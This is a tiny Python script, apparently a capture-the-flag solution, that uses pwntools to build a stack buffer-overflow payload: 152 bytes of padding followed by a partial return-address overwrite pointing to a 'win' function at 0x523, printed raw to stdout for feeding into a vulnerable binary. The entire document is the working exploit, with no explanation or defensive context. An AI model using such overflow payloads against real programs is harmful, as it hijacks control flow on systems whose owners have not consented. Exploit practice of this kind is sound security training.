import sys
from pwn import *
payload = b"A" * 152
win = p16(0x523)
payload += win
sys.stdout.buffer.write(payload)
